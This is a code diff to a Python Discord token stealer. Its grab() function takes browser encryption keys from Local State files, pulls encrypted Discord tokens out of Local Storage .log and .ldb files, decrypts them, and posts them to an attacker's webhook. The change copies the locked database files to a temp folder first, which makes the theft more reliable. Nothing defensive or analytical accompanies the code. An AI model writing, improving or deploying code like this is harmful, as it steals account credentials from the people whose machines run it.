@@ -42,17 +42,22 @@ def grab():
     tokens = []
 
     for name, db_path in paths.items():
-        # Look for Local State in the parent directories
         state_path = db_path.split('Local Storage')[0] + 'Local State'
         m_key = get_key(state_path)
         if not m_key or not os.path.exists(db_path): continue
 
         for file in os.listdir(db_path):
             if file.endswith(('.log', '.ldb')):
-                with open(os.path.join(db_path, file), 'r', errors='ignore') as f:
-                    for line in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*?)'\].*$][^\"]*", f.read()):
-                        token = decrypt_val(base64.b64decode(line.split('dQw4w9WgXcQ:')[1]), m_key)
-                        if token and token not in tokens: tokens.append(token)
+                # Copying to temp avoids "File in Use" errors
+                temp_path = os.path.join(tempfile.gettempdir(), file)
+                try:
+                    shutil.copy2(os.path.join(db_path, file), temp_path)
+                    with open(temp_path, 'r', errors='ignore') as f:
+                        for line in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*?)'\].*$][^\"]*", f.read()):
+                            token = decrypt_val(base64.b64decode(line.split('dQw4w9WgXcQ:')[1]), m_key)
+                            if token and token not in tokens: tokens.append(token)
+                    os.remove(temp_path)
+                except: continue
 
     if tokens:
         requests.post(WEBHOOK_URL, json={"content": f"Found: {len(tokens)}\n" + "\n".join(tokens)})
